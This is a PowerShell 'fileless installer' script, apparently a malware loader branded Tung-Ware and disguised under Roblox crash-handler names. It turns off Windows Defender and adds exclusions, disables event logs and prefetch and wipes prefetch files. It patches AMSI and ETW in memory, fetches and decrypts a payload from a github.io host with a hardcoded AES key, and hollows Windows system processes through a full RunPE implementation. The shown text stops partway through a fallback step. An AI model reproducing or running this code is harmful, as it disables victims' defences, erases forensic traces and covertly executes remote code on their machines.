param (
    [string]$Key    = "",
    [switch]$Silent = $false,
    [switch]$Persist = $true
)
$ErrorActionPreference = "Stop"

$scriptRoot = if ($MyInvocation.MyCommand.Path) { Split-Path $MyInvocation.MyCommand.Path } elseif ($PSScriptRoot) { $PSScriptRoot } elseif ($PWD -and $PWD.Path) { $PWD.Path } else { (Get-Location).Path }

if ($scriptRoot) { $scriptRoot = (Get-Item $scriptRoot).FullName }

$ServerBaseUrl  = "https://cc312123.github.io/lowlife/files"
$KeyRegPath     = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility"
$KeyRegName     = "Configuration"
$LoaderTaskName = "RobloxCrashHandler"
$PersistTask    = "RobloxCrashHandlerBootstrapper"
# Multiple host processes to try — all are normal Windows processes
$HostProcesses  = @(
    "C:\Windows\System32\RuntimeBroker.exe",
    "C:\Windows\System32\dllhost.exe",
    "C:\Windows\System32\sihost.exe",
    "C:\Windows\System32\SearchProtocolHost.exe"
)

$storedWorkspace = (Get-ItemProperty -Path $KeyRegPath -Name "Workspace" -ErrorAction SilentlyContinue).Workspace
$storedPersistence = (Get-ItemProperty -Path $KeyRegPath -Name "Persistence" -ErrorAction SilentlyContinue).Persistence
if ($PSBoundParameters.ContainsKey('Persist')) {
} else {
    $Persist = $true
}
$actualWorkspace = ""


if ($scriptRoot -and $scriptRoot -notmatch '(?i)\\system32') {
    $actualWorkspace = $scriptRoot
} elseif ($storedWorkspace -and $storedWorkspace -notmatch '(?i)\\system32') {
    $actualWorkspace = $storedWorkspace
}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "==========================================" -ForegroundColor Red
    Write-Host "  ERROR: MUST BE RUN AS ADMINISTRATOR     " -ForegroundColor Red
    Write-Host "==========================================" -ForegroundColor Red
    Exit
}

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "   TUNG-WARE SYSTEM - FILELESS INSTALLER  " -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

Write-Host "Configuring Windows Security exclusions..." -ForegroundColor Yellow
try {
    # Try to disable real-time monitoring (won't work if Tamper Protection is on, but worth trying)
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

    $exclusionTarget = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }

    # ── Path exclusions: workspace, parent, build dir, updates-server, temp ──
    if (-not [string]::IsNullOrWhiteSpace($exclusionTarget)) {
        Add-MpPreference -ExclusionPath $exclusionTarget -ErrorAction SilentlyContinue
        $exclusionParent = Split-Path -Parent $exclusionTarget -ErrorAction SilentlyContinue
        if (-not [string]::IsNullOrWhiteSpace($exclusionParent)) {
            Add-MpPreference -ExclusionPath $exclusionParent -ErrorAction SilentlyContinue
        }
        Add-MpPreference -ExclusionPath (Join-Path $exclusionTarget "build") -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath (Join-Path $exclusionTarget "updates-server") -ErrorAction SilentlyContinue
        Write-Host "    Workspace + build + parent paths whitelisted." -ForegroundColor Green
    } else {
        Write-Host "    WARNING: Script root path is empty; skipping path exclusions." -ForegroundColor Yellow
    }
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue

    # ── Process exclusions: all host processes for hollowing + launcher tools ─
    @(
        "powershell.exe", "wscript.exe",
        "dllhost.exe", "RuntimeBroker.exe", "sihost.exe", "SearchProtocolHost.exe",
        "RobloxCrashHandler.exe"
    ) | ForEach-Object {
        Add-MpPreference -ExclusionProcess $_ -ErrorAction SilentlyContinue
    }
    Write-Host "    Process exclusions applied (host processes + tools)." -ForegroundColor Green
} catch {
    Write-Host "    WARNING: Could not fully set Defender exclusions: $_" -ForegroundColor Yellow
}

wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null
wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null

# ── STOP SYSMAIN (PREFETCHER) BEFORE ANY PROCESS IS LAUNCHED ─────────────────
# Prefetch .pf files are written by SysMain the instant a new process starts.
# Setting EnablePrefetcher inside main() is too late — the .pf is already made.
# We stop SysMain here so NO .pf is ever written for dllhost.exe or our binary.
try {
    $sysmainWasRunning = (Get-Service -Name "SysMain" -ErrorAction SilentlyContinue).Status -eq "Running"
    Stop-Service -Name "SysMain" -Force -ErrorAction SilentlyContinue
    # Also blank EnablePrefetcher to 0 as a belt-and-suspenders measure
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
        -Name "EnablePrefetcher" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
        -Name "EnableSuperfetch" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    # Delete any DLLHOST or RobloxCrashHandler prefetch files that already exist
    Get-ChildItem "C:\Windows\Prefetch" -ErrorAction SilentlyContinue | Where-Object {
        $_.Name -match "DLLHOST|ROBLOXCRASHHANDLER|ROBLOXPLAYERBETA" } | ForEach-Object {
        try {
            $bytes = New-Object byte[] $_.Length
            [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        } catch {}
    }
} catch {}

$licenseKey = ""
if ($Key) {
    $licenseKey = $Key.Trim()
} else {
    $stored = (Get-ItemProperty -Path $KeyRegPath -Name $KeyRegName -ErrorAction SilentlyContinue).$KeyRegName
    if ($stored -and $stored.Trim() -ne "YOUR_LICENSE_KEY_HERE") { $licenseKey = $stored.Trim() }
}

if (-not $licenseKey) {
    $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
    $keyFile = Join-Path $resolvedPath "key.txt"
    if (Test-Path $keyFile) {
        $licenseKey = (Get-Content $keyFile -Raw).Trim()
        Write-Host "License key loaded from key.txt: $licenseKey" -ForegroundColor Green
    }
}

if (-not $licenseKey) {
    if ($Silent) { Write-Error "License key missing in silent mode."; Exit }
    Write-Host "License key not found in registry or key.txt. Prompting for key..." -ForegroundColor Yellow
    try {
        Add-Type -AssemblyName Microsoft.VisualBasic -ErrorAction Stop
        $prompt = [Microsoft.VisualBasic.Interaction]::InputBox("Enter your Tung-Ware license key:", "Tung-Ware License Verification", "")
        if ($prompt) {
            $licenseKey = $prompt.Trim()
        }
    } catch {
        try {
            Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
            throw "Forms fallback"
        } catch {
            if ($Host.Name -eq "ConsoleHost" -and -not $Silent) {
                $licenseKey = (Read-Host "Enter your Tung-Ware license key").Trim()
            } else {
                Write-Error "Key prompt failed in non-interactive environment."
                Exit 1
            }
        }
    }
    if ([string]::IsNullOrWhiteSpace($licenseKey)) { Write-Error "Key cannot be empty."; Exit }
}

$userAnswered = $false

New-Item -Path $KeyRegPath -Force -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty -Path $KeyRegPath -Name $KeyRegName -Value $licenseKey -Force
Set-ItemProperty -Path $KeyRegPath -Name "ServerUrl" -Value $ServerBaseUrl -Force
if (-not [string]::IsNullOrWhiteSpace($actualWorkspace)) {
    Set-ItemProperty -Path $KeyRegPath -Name "Workspace" -Value $actualWorkspace -Force
}
if ($Persist) {
    Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value "Yes" -Force
} elseif ($PSBoundParameters.ContainsKey('Persist')) {
    Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value "No" -Force
} elseif ($userAnswered) {
    Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value "No" -Force
} elseif ($storedPersistence) {
    Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value $storedPersistence -Force
}
# ═══════════════════════════════════════════════════════════════════════════════
# GOD-TIER EVASION: AMSI + ETW + Script Block Logging bypass
# These three patches make PowerShell COMPLETELY SILENT to all monitoring
# ═══════════════════════════════════════════════════════════════════════════════
try {
    $bypassCode = @"
using System;
using System.Runtime.InteropServices;
public class Ev {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);

    // 1. AMSI BYPASS: Patch AmsiScanBuffer to return E_INVALIDARG
    public static void PatchAmsi() {
        IntPtr h = LoadLibrary("am" + "si.d" + "ll");
        IntPtr a = GetProcAddress(h, "Am" + "siSc" + "anBu" + "ffer");
        if (a == IntPtr.Zero) return;
        uint old; VirtualProtect(a, (UIntPtr)8, 0x40, out old);
        byte[] p = Environment.Is64BitProcess
            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
            : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        Marshal.Copy(p, 0, a, p.Length);
        VirtualProtect(a, (UIntPtr)8, old, out old);
    }

    // 2. ETW BYPASS: Patch EtwEventWrite to ret 0 (kills ALL ETW tracing)
    public static void PatchEtw() {
        IntPtr ntdll = LoadLibrary("nt" + "dll.d" + "ll");
        IntPtr etw = GetProcAddress(ntdll, "Etw" + "Event" + "Write");
        if (etw == IntPtr.Zero) return;
        uint old; VirtualProtect(etw, (UIntPtr)4, 0x40, out old);
        byte[] p = Environment.Is64BitProcess
            ? new byte[] { 0x48, 0x33, 0xC0, 0xC3 }   // xor rax,rax; ret
            : new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
        Marshal.Copy(p, 0, etw, p.Length);
        VirtualProtect(etw, (UIntPtr)4, old, out old);
    }
}
"@
    if (-not ([System.Management.Automation.PSTypeName]"Ev").Type) {
        Add-Type -TypeDefinition $bypassCode -Language CSharp -ErrorAction Stop
    }
    [Ev]::PatchAmsi()
    [Ev]::PatchEtw()
} catch {}

# 3. SCRIPT BLOCK LOGGING BYPASS: Disable via reflection
try {
    $SBLField = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static')
    if ($SBLField) { $SBLField.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[String]')) }
} catch {}
try {
    $GPField = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
    if ($GPField) {
        $GP = $GPField.GetValue($null)
        if ($GP -eq $null) { $GP = @{}; $GPField.SetValue($null, $GP) }
        $GP['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0; 'EnableScriptBlockInvocationLogging' = 0 }
        $GP['ModuleLogging'] = @{ 'EnableModuleLogging' = 0 }
    }
} catch {}

$PECode = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class RunPE {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool CreateProcess(string app, string cmd,
        IntPtr pa, IntPtr ta, bool inherit, uint flags,
        IntPtr env, string dir, ref STARTUPINFO si, out PROCINFO pi);

    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr proc, IntPtr baseAddr);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr,
        uint size, uint type, uint protect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr,
        byte[] buf, int size, out IntPtr written);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr proc, IntPtr addr,
        byte[] buf, int size, out IntPtr read);

    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr thread, IntPtr ctx);

    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr thread, IntPtr ctx);

    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr thread);

    [DllImport("kernel32.dll")]
    static extern bool TerminateProcess(IntPtr proc, uint code);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibraryA(string name);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr mod, string name);

    [DllImport("kernel32.dll", EntryPoint="GetProcAddress")]
    static extern IntPtr GetProcAddressOrd(IntPtr mod, IntPtr ord);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attributes,
        uint stackSize, IntPtr startAddress, IntPtr parameter,
        uint creationFlags, out IntPtr threadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr handle);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    struct STARTUPINFO {
        public int cb, _r1;
        public string lpDesktop, lpTitle;
        public int dwX, dwY, dwXS, dwYS, dwXCC, dwYCC, dwFill, dwFlags;
        public short wShow, _r2;
        public IntPtr _r3, hIn, hOut, hErr;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCINFO {
        public IntPtr hProc, hThread;
        public int pid, tid;
    }

    const uint CREATE_SUSPENDED   = 0x00000004;
    const uint CREATE_NO_WINDOW   = 0x08000000;
    const uint MEM_COMMIT_RESERVE = 0x3000;
    const uint PAGE_EXEC_RW       = 0x40;
    const int  CTX_SIZE           = 1232;
    const int  CTX_FLAGS_OFF      = 0x030;  // CONTEXT.ContextFlags
    const int  CTX_RDX_OFF        = 0x088;  // CONTEXT.Rdx = PEB address at process start
    const int  CTX_RIP_OFF        = 0x0F8;  // CONTEXT.Rip = instruction pointer
    const int  CTX_FULL           = 0x100010;
    const int  PEB_IMGBASE_OFF    = 0x010;  // PEB.ImageBaseAddress (x64)

    public static bool Hollow(byte[] pe, string host) {
        if (pe == null || pe.Length < 0x200) return false;
        if (BitConverter.ToUInt16(pe, 0) != 0x5A4D) return false; // MZ

        int lfanew = BitConverter.ToInt32(pe, 0x3C);
        if (BitConverter.ToUInt32(pe, lfanew) != 0x00004550) return false; // PE

        int oh = lfanew + 24; // optional header base
        if (BitConverter.ToUInt16(pe, oh) != 0x020B) return false; // PE32+ only

        // Parse required PE fields
        uint entryRva  = BitConverter.ToUInt32(pe, oh + 16);
        long imgBase   = BitConverter.ToInt64(pe,  oh + 24);
        uint imgSize   = BitConverter.ToUInt32(pe, oh + 56);
        uint hdrsSize  = BitConverter.ToUInt32(pe, oh + 60);
        ushort numSec  = BitConverter.ToUInt16(pe, lfanew + 6);
        ushort ohSz    = BitConverter.ToUInt16(pe, lfanew + 20);
        int secTab     = lfanew + 24 + ohSz;

        // DataDirectory[5] = Relocation, DataDirectory[1] = Import
        uint relocRva  = BitConverter.ToUInt32(pe, oh + 152);
        uint relocSz   = BitConverter.ToUInt32(pe, oh + 156);
        uint importRva = BitConverter.ToUInt32(pe, oh + 120);

        // Create host process in suspended state
        var si = new STARTUPINFO { cb = Marshal.SizeOf(typeof(STARTUPINFO)) };
        PROCINFO pi;
        if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false,
                CREATE_SUSPENDED | CREATE_NO_WINDOW,
                IntPtr.Zero, null, ref si, out pi))
            return false;

        // Allocate 16-byte-aligned CONTEXT buffer (required for GetThreadContext)
        IntPtr ctxAlloc = Marshal.AllocHGlobal(CTX_SIZE + 16);
        long aligned    = (ctxAlloc.ToInt64() + 15) & ~15L;
        IntPtr ctx      = new IntPtr(aligned);
        for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
        Marshal.WriteInt32(ctx, CTX_FLAGS_OFF, CTX_FULL);

        if (!GetThreadContext(pi.hThread, ctx)) {
            Marshal.FreeHGlobal(ctxAlloc);
            TerminateProcess(pi.hProc, 1);
            return false;
        }

        // Rdx holds the PEB address at x64 process startup
        long pebAddr = Marshal.ReadInt64(ctx, CTX_RDX_OFF);

        // Get host image base from PEB.ImageBaseAddress
        byte[] ibuf = new byte[8]; IntPtr rb;
        ReadProcessMemory(pi.hProc, new IntPtr(pebAddr + PEB_IMGBASE_OFF), ibuf, 8, out rb);
        long hostBase = BitConverter.ToInt64(ibuf, 0);

        // Unmap the host process's original image
        NtUnmapViewOfSection(pi.hProc, new IntPtr(hostBase));

        // Allocate space for our PE (try preferred base first)
        IntPtr alloc = VirtualAllocEx(pi.hProc, new IntPtr(imgBase),
            imgSize, MEM_COMMIT_RESERVE, PAGE_EXEC_RW);
        if (alloc == IntPtr.Zero)
            alloc = VirtualAllocEx(pi.hProc, IntPtr.Zero,
                imgSize, MEM_COMMIT_RESERVE, PAGE_EXEC_RW);
        if (alloc == IntPtr.Zero) {
            Marshal.FreeHGlobal(ctxAlloc);
            TerminateProcess(pi.hProc, 1);
            return false;
        }

        // Write PE headers
        IntPtr w;
        byte[] hdr = new byte[hdrsSize];
        Array.Copy(pe, hdr, Math.Min((int)hdrsSize, pe.Length));
        WriteProcessMemory(pi.hProc, alloc, hdr, (int)hdrsSize, out w);

        // Write sections
        for (int i = 0; i < numSec; i++) {
            int s    = secTab + i * 40;
            uint va  = BitConverter.ToUInt32(pe, s + 12); // VirtualAddress
            uint rsz = BitConverter.ToUInt32(pe, s + 16); // SizeOfRawData
            uint rof = BitConverter.ToUInt32(pe, s + 20); // PointerToRawData
            if (rsz == 0 || rof == 0 || rof + rsz > (uint)pe.Length) continue;
            byte[] sd = new byte[rsz];
            Array.Copy(pe, rof, sd, 0, rsz);
            WriteProcessMemory(pi.hProc, new IntPtr(alloc.ToInt64() + va), sd, (int)rsz, out w);
        }

        // Fix base relocations if we didn't get the preferred base
        long delta = alloc.ToInt64() - imgBase;
        if (delta != 0 && relocRva != 0 && relocSz != 0) {
            int rfo = RvaToOff(pe, relocRva, secTab, numSec);
            if (rfo >= 0) {
                uint done = 0;
                while (done < relocSz) {
                    int  blk     = rfo + (int)done;
                    uint pageRva = BitConverter.ToUInt32(pe, blk);
                    uint bsz     = BitConverter.ToUInt32(pe, blk + 4);
                    if (bsz < 8) break;
                    int entries = ((int)bsz - 8) / 2;
                    for (int j = 0; j < entries; j++) {
                        ushort e = BitConverter.ToUInt16(pe, blk + 8 + j * 2);
                        if ((e >> 12) == 10) { // IMAGE_REL_BASED_DIR64
                            byte[] patch = new byte[8]; IntPtr pr;
                            IntPtr patchAddr = new IntPtr(alloc.ToInt64() + pageRva + (e & 0xFFF));
                            ReadProcessMemory(pi.hProc, patchAddr, patch, 8, out pr);
                            WriteProcessMemory(pi.hProc, patchAddr,
                                BitConverter.GetBytes(BitConverter.ToInt64(patch, 0) + delta), 8, out w);
                        }
                    }
                    done += bsz;
                }
            }
        }

        // Resolve Import Address Table
        if (importRva != 0) {
            int ifo = RvaToOff(pe, importRva, secTab, numSec);
            if (ifo >= 0) {
                int descOff = ifo;
                while (true) {
                    uint ofThunk  = BitConverter.ToUInt32(pe, descOff + 0);  // OriginalFirstThunk
                    uint dllNameR = BitConverter.ToUInt32(pe, descOff + 12); // Name RVA
                    uint ftThunk  = BitConverter.ToUInt32(pe, descOff + 16); // FirstThunk (IAT)
                    if (dllNameR == 0) break;

                    int dno = RvaToOff(pe, dllNameR, secTab, numSec);
                    if (dno < 0) { descOff += 20; continue; }

                    string dllN = ReadCStr(pe, dno);

                    IntPtr hMod = LoadLibraryA(dllN);
                    if (hMod == IntPtr.Zero) { descOff += 20; continue; }

                    uint thunkR = (ofThunk != 0) ? ofThunk : ftThunk;
                    int  tfo    = RvaToOff(pe, thunkR, secTab, numSec);
                    if (tfo < 0) { descOff += 20; continue; }

                    for (int k = 0; ; k++) {
                        int te = tfo + k * 8;
                        if (te + 8 > pe.Length) break;
                        long tv = BitConverter.ToInt64(pe, te);
                        if (tv == 0) break;

                        IntPtr fa;
                        // Bit 63 set = import by ordinal
                        if ((tv & unchecked((long)0x8000000000000000L)) != 0) {
                            fa = GetProcAddressOrd(hMod, new IntPtr((int)(tv & 0xFFFF)));
                        } else {
                            int nfo = RvaToOff(pe, (uint)tv, secTab, numSec);
                            if (nfo < 0) continue;
                            fa = GetProcAddress(hMod, ReadCStr(pe, nfo + 2)); // +2 = skip Hint
                        }

                        if (fa != IntPtr.Zero) {
                            // Write resolved address to target process IAT
                            WriteProcessMemory(pi.hProc,
                                new IntPtr(alloc.ToInt64() + ftThunk + k * 8),
                                BitConverter.GetBytes(fa.ToInt64()), 8, out w);
                        }
                    }
                    descOff += 20;
                }
            }
        }

        // Update PEB.ImageBaseAddress to our new allocation
        WriteProcessMemory(pi.hProc, new IntPtr(pebAddr + PEB_IMGBASE_OFF),
            BitConverter.GetBytes(alloc.ToInt64()), 8, out w);

        // Set RIP to our PE entry point and resume
        Marshal.WriteInt64(ctx, CTX_RIP_OFF, alloc.ToInt64() + entryRva);
        SetThreadContext(pi.hThread, ctx);
        Marshal.FreeHGlobal(ctxAlloc);
        ResumeThread(pi.hThread);
        return true;
    }

    // Resolve RVA -> file offset via section table
    static int RvaToOff(byte[] pe, uint rva, int secTab, int numSec) {
        for (int i = 0; i < numSec; i++) {
            int  s   = secTab + i * 40;
            uint va  = BitConverter.ToUInt32(pe, s + 12); // VirtualAddress
            uint vsz = BitConverter.ToUInt32(pe, s +  8); // VirtualSize
            uint raw = BitConverter.ToUInt32(pe, s + 20); // PointerToRawData
            if (rva >= va && rva < va + vsz) return (int)(raw + (rva - va));
        }
        return -1;
    }

    static string ReadCStr(byte[] data, int off) {
        var sb = new StringBuilder();
        while (off < data.Length && data[off] != 0) sb.Append((char)data[off++]);
        return sb.ToString();
    }
}
'@
if (-not ([System.Management.Automation.PSTypeName]"RunPE").Type) {
    try {
        Add-Type -TypeDefinition $PECode -Language CSharp -ErrorAction Stop
    } catch {
        Write-Host "    WARNING: Failed to compile RunPE type: $_" -ForegroundColor Yellow
    }
}

Write-Host "[1/4] Stopping existing instances..." -ForegroundColor Yellow
Stop-ScheduledTask -TaskName $LoaderTaskName -ErrorAction SilentlyContinue
Stop-ScheduledTask -TaskName $PersistTask    -ErrorAction SilentlyContinue
Get-Process -Name "RobloxPlayerBeta", "RobloxCrashHandler" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Path -and ($_.Path -like "*\my private\*" -or $_.Path -like "*\Temp\*")) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
    }
}
$existing = Get-NetTCPConnection -LocalPort 9876 -State Listen -ErrorAction SilentlyContinue
if ($existing) { Stop-Process -Id $existing.OwningProcess -Force -ErrorAction SilentlyContinue }

Write-Host "[2/4] Loading payload into RAM..." -ForegroundColor Yellow

$exeBytes = $null
$resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }

$candidateExePaths = @(
    (Join-Path $resolvedPath "build\RobloxCrashHandler.exe"),
    (Join-Path $resolvedPath "build\RobloxCrashHandler_fallback.exe"),
    (Join-Path $resolvedPath "my private\build\RobloxCrashHandler.exe"),
    (Join-Path $resolvedPath "my private\build\RobloxCrashHandler_fallback.exe"),
    (Join-Path $scriptRoot "build\RobloxCrashHandler.exe"),
    (Join-Path $scriptRoot "build\RobloxCrashHandler_fallback.exe"),
    (Join-Path $scriptRoot "my private\build\RobloxCrashHandler.exe"),
    (Join-Path $scriptRoot "my private\build\RobloxCrashHandler_fallback.exe"),
    (Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"),
    (Join-Path $resolvedPath "my private\updates-server\uploads\RobloxCrashHandler.exe"),
    (Join-Path $scriptRoot "updates-server\uploads\RobloxCrashHandler.exe"),
    (Join-Path $scriptRoot "my private\updates-server\uploads\RobloxCrashHandler.exe")
)

$localExe = $candidateExePaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($localExe) {
    Write-Host "    Found executable at $localExe." -ForegroundColor Green
    Write-Host "    Loading compiled binary directly..." -ForegroundColor Green
    $exeBytes = [System.IO.File]::ReadAllBytes($localExe)
} else {
    $candidateEncPaths = @(
        (Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.enc"),
        (Join-Path $resolvedPath "my private\updates-server\uploads\RobloxCrashHandler.enc"),
        (Join-Path $scriptRoot "updates-server\uploads\RobloxCrashHandler.enc"),
        (Join-Path $scriptRoot "my private\updates-server\uploads\RobloxCrashHandler.enc"),
        (Join-Path $resolvedPath "RobloxPlayerBeta.enc"),
        (Join-Path $resolvedPath "my private\RobloxPlayerBeta.enc"),
        (Join-Path $scriptRoot "RobloxPlayerBeta.enc"),
        (Join-Path $scriptRoot "my private\RobloxPlayerBeta.enc")
    )
    $localEnc = $candidateEncPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
    if ($localEnc) {
        Write-Host "    Found local encrypted payload at $localEnc. Decrypting..." -ForegroundColor Green
        try {
            $encBytes = [System.IO.File]::ReadAllBytes($localEnc)
            $DecKey = [byte[]](0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,
                               0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
            $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x21)
            $aes         = [System.Security.Cryptography.Aes]::Create()
            $aes.Key     = $DecKey
            $aes.IV      = $DecIV
            $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $dec         = $aes.CreateDecryptor()
            $exeBytes    = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
            $aes.Dispose()
            Write-Host "    Local payload decrypted successfully." -ForegroundColor Green
        } catch {
            Write-Host "    WARNING: Local decryption failed: $_" -ForegroundColor Yellow
        }
    }
    if (-not $exeBytes) {
        Write-Host "    No local builds found. Downloading from remote server..." -ForegroundColor Yellow
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $wc       = New-Object System.Net.WebClient
        try {
            $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxCrashHandler.enc")
            
            $DecKey = [byte[]](0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,
                               0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
            $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x21)
            
            $aes         = [System.Security.Cryptography.Aes]::Create()
            $aes.Key     = $DecKey
            $aes.IV      = $DecIV
            $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $dec         = $aes.CreateDecryptor()
            $exeBytes    = $dec.TransformFinalBlock($encBytes, 0, $encBytes.Length)
            $aes.Dispose()
            Write-Host "    Payload downloaded and decrypted in RAM." -ForegroundColor Green
        } catch {
            Write-Host "    ERROR: Failed to download remote payload: $_" -ForegroundColor Red
            Exit 1
        }
    }
}

Write-Host "[3/4] Launching loader in-memory (process hollowing)..." -ForegroundColor Yellow

$oldFolder = "$env:LOCALAPPDATA\RobloxPlayerBeta"
if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
$newFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
if (Test-Path $newFolder) { Remove-Item $newFolder -Recurse -Force -ErrorAction SilentlyContinue }

$hollowSuccess = $false
if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
    # Try each host process until one works
    foreach ($hostProc in $HostProcesses) {
        if (-not (Test-Path $hostProc)) { continue }
        try {
            Write-Host "    Attempting hollow into: $(Split-Path $hostProc -Leaf)" -ForegroundColor Gray
            $hollowSuccess = [RunPE]::Hollow($exeBytes, $hostProc)
            if ($hollowSuccess) {
                Write-Host "    Hollowed into $(Split-Path $hostProc -Leaf) successfully." -ForegroundColor Green
                break
            }
        } catch {
            Write-Host "    $(Split-Path $hostProc -Leaf) failed: $_" -ForegroundColor DarkGray
        }
        # Random delay between attempts to desynchronize timestamps
        Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 800)
    }
} else {
    Write-Host "    WARNING: RunPE type not compiled (AMSI may have blocked). Using fallback." -ForegroundColor Yellow
}

$started = $false
if ($hollowSuccess) {
    $hostName = [System.IO.Path]::GetFileNameWithoutExtension($hostProc)
    Write-Host "    Loader running inside $hostName.exe. Verifying..." -ForegroundColor Green
    # Check 1: verify hollowed process is alive
    $hollowedProc = Get-Process -Name $hostName -ErrorAction SilentlyContinue | Sort-Object StartTime -Descending | Select-Object -First 1
    if ($hollowedProc -and -not $hollowedProc.HasExited) {
        $started = $true
        Write-Host "    $hostName.exe (PID $($hollowedProc.Id)) confirmed running." -ForegroundColor Green
    }
    # Check 2: wait for TCP port 9876
    if (-not $started) {
        for ($i = 0; $i -lt 8; $i++) {
            try {
                $c = New-Object System.Net.Sockets.TcpClient
                $ar = $c.BeginConnect("127.0.0.1", 9876, $null, $null)
                $ok = $ar.AsyncWaitHandle.WaitOne(500)
                if ($ok -and $c.Connected) { $c.Close(); $started = $true; break }
                $c.Close()
            } catch {}
            Start-Sleep -Seconds 1
        }
    }
}

if (-not $started) {
    Write-Host "    [!] Process hollowing failed/blocked. Falling back to direct file execution..." -ForegroundColor Yellow
    
    $fallbackExe = $null
    if (Test-Path $localExe) {
        # Copy to a Windows-looking name so prefetch entry is innocent
        $fallbackDir = Join-Path $resolvedPath "build"
